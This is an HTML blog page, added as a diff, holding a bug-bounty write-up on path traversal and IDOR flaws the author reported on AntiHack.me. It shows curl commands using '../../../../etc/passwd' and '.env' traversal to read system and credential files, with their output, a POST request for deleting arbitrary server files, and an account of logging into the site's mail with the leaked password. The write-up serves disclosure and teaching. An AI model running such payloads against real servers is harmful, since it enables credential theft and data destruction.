@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creati...">
+  <meta name="keywords" content="bug hunting, bug hunter, pentest, penetration testing, and hacking">
+  <meta name="author" content="How I Found Multiple Vulnerabilities on AntiHack.Me | Noobe.io">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#f5f5f5">
+  <meta name="google-site-verification" content="ovHMjnPbV77CCgMqbuScCfGjNhvMThbOFTHcHtuURHo" />
+
+  <!-- Twitter Tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="How I Found Multiple Vulnerabilities on AntiHack.Me | Noobe.io">
+  <meta name="twitter:description" content="AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creati...">
+  
+  <meta property="twitter:image" content="http://localhost:4000/img/c943919f00e9a4a7cd67a30b257c3ea1-f.png">
+  
+
+  <!-- Open Graph Tags -->
+  <meta property="og:type" content="blog">
+  <meta property="og:url" content="http://localhost:4000/articles/2019-01/how-i-hack-antihack-me">
+  <meta property="og:title" content="How I Found Multiple Vulnerabilities on AntiHack.Me | Noobe.io">
+  <meta property="og:description" content="AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creati...">
+  
+  <meta property="og:image" content="http://localhost:4000/img/c943919f00e9a4a7cd67a30b257c3ea1-f.png">
+  
+  <title>How I Found Multiple Vulnerabilities on AntiHack.Me | Noobe.io</title>
+
+  <!-- CSS files -->
+  <link rel="stylesheet" href="http://localhost:4000/css/font-awesome.min.css">
+  <link rel="stylesheet" href="http://localhost:4000/css/main.css">
+
+  <link rel="canonical" href="http://localhost:4000/articles/2019-01/how-i-hack-antihack-me">
+  <link rel="alternate" type="application/rss+xml" title="Noobe.io" href="http://localhost:4000/feed.xml" />
+
+  <!-- Icons -->
+  <!-- 16x16 -->
+  <link rel="shortcut icon" href="http://localhost:4000/img/noobe-favicon.png">
+  <!-- 32x32 -->
+  <link rel="shortcut icon" href="http://localhost:4000/img/noobe-favicon.png">
+  <link rel="stylesheet" type="text/css" href="http://localhost:4000/css/cookieconsent.min.css"/>
+</head>
+
+
+<body>
+  <div class="row">
+    <div class="col s12 m3">
+      <div class="table cover">
+        
+
+<div class="cover-card table-cell table-middle">
+  
+  <a href="http://localhost:4000/">
+    <img src="http://localhost:4000/img/noobe-logo.png" alt="" class="avatar">
+  </a>
+  
+  <a href="http://localhost:4000/" class="author_name">noobe.io</a>
+  <span class="author_job">Pentester • Bug Hunter • Security Enthusiast</span>
+  <span class="author_bio mbm">Just another noob post.</span>
+  <nav class="nav">
+    <ul class="nav-list">
+      <li class="nav-item">
+        <a href="http://localhost:4000/">home</a>
+      </li>
+       
+      <li class="nav-item">
+        <a href="http://localhost:4000/archive/">Archive</a>
+      </li>
+        
+      <li class="nav-item">
+        <a href="http://localhost:4000/cookie-policy/">Cookie Policy</a>
+      </li>
+          
+      <li class="nav-item">
+        <a href="http://localhost:4000/categories/">Categories</a>
+      </li>
+            
+      <li class="nav-item">
+        <a href="http://localhost:4000/tags/">Tags</a>
+      </li>
+         
+    </ul>
+  </nav>
+  <script type="text/javascript">
+  // based on http://stackoverflow.com/a/10300743/280842
+  function gen_mail_to_link(hs, subject) {
+    var lhs,rhs;
+    var p = hs.split('@');
+    lhs = p[0];
+    rhs = p[1];
+    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
+    document.write(":" + lhs + "@");
+    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
+  }
+</script>
+<div class="social-links">
+  <ul>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </ul>
+</div>
+
+</div>
+
+      </div>
+    </div>
+    <div class="col s12 m9">
+      <div class="post-listing">
+        <a class="btn" href= "http://localhost:4000/" >
+  Home
+</a>
+
+<div id="post">
+  <header class="post-header">
+    <h1 title="How I Found Multiple Vulnerabilities on AntiHack.Me">How I Found Multiple Vulnerabilities on AntiHack.Me</h1>
+    <span class="post-meta">
+      <span class="post-date">
+        11 JAN 2019
+      </span>
+      •
+      <span class="read-time" title="Estimated read time">
+  
+  
+    3 mins read
+  
+</span>
+
+    </span>
+
+  </header>
+
+  <article class="post-content">
+    <p>AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creating an account, the user will be provided with information regarding the Bug Bounty Program found at AntiHack, and the AntiHack site itself is included in the program.</p>
+
+<h4 id="vulnerability-i-local-file-disclosure">VULNERABILITY I (Local File Disclosure)</h4>
+
+<p>When accessing the https://www.antihack.me/blog page, the website will display Popup Modal which contains an invitation to subscribe to AntiHack Magazine, which is an E-Zine made by them. The process is by entering some information in the field provided, then pressing the Submit button. After the Submit button is pressed, the user will be directed to the link to download the E-Zine. Following is the form of the link:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.antihack.me/filedownload.php?file=AntiHACKJan19Issue.pdf
+</code></pre></div></div>
+
+<p>From this structure, it can be seen that the file <code class="language-plaintext highlighter-rouge">filedownload.php</code> may have a Local File Disclosure vulnerability, where by using this file, we can download sensitive files that are on the server. I tried using curl like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@noobe.io ~]# curl https://www.antihack.me/filedownload.php?file=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</code></pre></div></div>
+
+<p>It can be seen that the file <code class="language-plaintext highlighter-rouge">filedownload.php</code> really has a vulnerability so we can download files on the server. Because the AntiHack.me website uses Laravel, then I try to get the config file, which is in the <code class="language-plaintext highlighter-rouge">.env</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@noobe.io ~]# curl https://www.antihack.me/filedownload.php?file=../../../../var/www/html/.env
+
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=antihack
+DB_USERNAME=antihack
+DB_PASSWORD=
+
+MAIL_DRIVER=smtp
+MAIL_HOST=smtp.zoho.com
+MAIL_PORT=465
+MAIL_USERNAME=admin@antihack.me
+MAIL_PASSWORD=[ redacted ]
+</code></pre></div></div>
+
+<p>From this information, I obtain sensitive information such as user and database passwords. There is even an SMTP user and password used. I tried logging in using the SMTP user and password obtained and it’s worked XD.</p>
+
+<p><img src="/assets/c943919f00e9a4a7cd67a30b257c3ea1-1.png" alt="AntiHack.Me Zoho Account" /></p>
+
+<h4 id="vulnerability-ii-idor-delete-any-file-on-antihackme-server">VULNERABILITY II (IDOR Delete Any File on AntiHack.me Server)</h4>
+
+<p>As on other Bug Bounty websites, there is a feature for reporting vulnerability found. There is also an attach file feature to add image or video files to complete the report that we send. After finishing uploading the file on the report form, an X button appears which serves to delete the file that was just uploaded, of course the function is to delete the file if we incorrectly upload the report file.</p>
+
+<p><img src="/assets/c943919f00e9a4a7cd67a30b257c3ea1-2.png" alt="AntiHack.Me Delete File Button" /></p>
+
+<p>When the button is clicked, the process runs like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /php/ajax_remove_file.php HTTP/1.1
+Host: www.antihack.me
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.antihack.me/hacker_inbox
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 21
+Cookie: [ redacted ]
+Connection: close
+
+file=35C2XxQY_400x400.png
+</code></pre></div></div>
+
+<p>Unfortunately there is no validation of any files that may be deleted. By manipulating the values of the <code class="language-plaintext highlighter-rouge">file</code> parameters we can delete any files contained on the AntiHack.me server.</p>
+
+<p>For more details, please see the following GIF:</p>
+
+<p><img src="/assets/c943919f00e9a4a7cd67a30b257c3ea1-3.gif" alt="AntiHack.Me Delete File GIF" /></p>
+
+<p>In my trial I tried to delete files with several different extensions, but I did not try to delete files outside the website folder because I was worried that they might interfere and even damage the website.</p>
+
+<p>Those are some of the vulnerabilities that were found on the Anti Hack.me website. Currently all of these vulnerabilities have been fixed by AntiHack.me.</p>
+
+<h4 id="timeline">Timeline</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-01-03: Bug reported
+2019-01-04: Triaged
+2019-01-06: Bug Fixed
+2019-01-09: Report Resolved
+2019-01-09: Swag Rewarded
+</code></pre></div></div>
+
+<p><strong>References:</strong></p>
+
+<ul>
+  <li>CWE-200 : Information Exposure</li>
+  <li>CWE-284: Improper Access Control</li>
+</ul>
+
+  </article>
+</div>
+
+<div class="share-buttons">
+  <h6>Share on: </h6>
+  <ul>
+    <li>
+      <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/articles/2019-01/how-i-hack-antihack-me" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+    </li>
+    <li>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/articles/2019-01/how-i-hack-antihack-me" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+    </li>
+    <li>
+      <a href="https://plus.google.com/share?url=http://localhost:4000/articles/2019-01/how-i-hack-antihack-me" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+    </li>
+    <li>
+      <a href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/articles/2019-01/how-i-hack-antihack-me" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+    </li>
+    <li>
+      <a href="https://www.reddit.com/submit?url=http://localhost:4000/articles/2019-01/how-i-hack-antihack-me" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+    </li>
+  </ul>
+</div><!-- end share-buttons -->
+
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'noobe';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+        <footer>
+  &copy; 2020 Noobe.io. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
+</footer>
+
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript" src="http://localhost:4000/js/jquery-3.2.1.min.js"></script>
+<script type="text/javascript" src="http://localhost:4000/js/main.js"></script>
+<script src="http://localhost:4000/js/cookieconsent.min.js"></script>
+<script>
+      window.addEventListener("load", function(){window.wpcc.init({"border":"thin","corners":"small","colors":{"popup":{"background":"#f0edff","text":"#000000","border":"#5e65c2"},"button":{"background":"#5e65c2","text":"#ffffff"}},"position":"bottom","fontsize":"small","content":{"href":"http://noobe.io/cookie-policy/"}})});
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-156423500-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-156423500-1');
+</script>
+
+
+
+</body>
+</html>
